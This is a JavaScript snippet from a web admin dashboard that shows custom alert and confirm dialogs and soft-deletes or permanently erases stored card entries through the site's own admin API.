function showCustomAlert(title, message) {
  showCustomConfirm(title, message, () => {});
  const cancelBtn = document.getElementById('confirm-cancel-btn');
  if (cancelBtn) cancelBtn.style.display = 'none';
  const okBtn = document.getElementById('confirm-ok-btn');
  if (okBtn) {
    okBtn.innerText = 'Dismiss';
    okBtn.style.background = 'var(--primary-color)';
    okBtn.style.borderColor = 'var(--primary-color)';
  }
  
  const okBtnClick = () => {
    if (cancelBtn) cancelBtn.style.display = 'block';
    if (okBtn) {
      okBtn.innerText = 'Delete';
      okBtn.style.background = '#ef4444';
      okBtn.style.borderColor = '#ef4444';
    }
  };

  const backdrop = document.getElementById('confirm-modal-backdrop');
  backdrop.addEventListener('click', okBtnClick, { once: true });
  okBtn.addEventListener('click', okBtnClick, { once: true });
}

// Soft delete active card entry
window.deleteCard = function(cardNumber) {
  showCustomConfirm(
    '🗑️ Delete Card Log',
    'Are you sure you want to move this card log to the trash bin?',
    async () => {
      try {
        const response = await fetch(`/api/admin/cards/${encodeURIComponent(cardNumber)}/delete`, {
          method: 'PUT',
          headers: getAuthHeaders()
        });

        if (response.status === 401) return handleSessionExpired();
        const data = await response.json();
        if (!response.ok) throw new Error(data.error);

        await fetchAdminCards();
      } catch (err) {
        showCustomAlert('❌ Execution Failed', err.message || 'Failed to soft delete card.');
      }
    }
  );
};

// Permanent hard delete card entry from database
window.deletePermanentCard = function(cardNumber) {
  showCustomConfirm(
    '⚠️ Permanent Erasure',
    'Are you sure you want to permanently erase this card details from database? This action is irreversible.',
    async () => {
      try {
        const response = await fetch(`/api/admin/cards/${encodeURIComponent(cardNumber)}`, {
          method: 'DELETE',
          headers: getAuthHeaders()
        });

        if (response.status === 401) return handleSessionExpired();
        const data = await response.json();
        if (!response.ok) throw new Error(data.error);

        await fetchAdminCards(trashDecryptionKey);
      } catch (err) {
        showCustomAlert('❌ Execution Failed', err.message || 'Failed to permanently delete card.');
      }
    }
  );
};
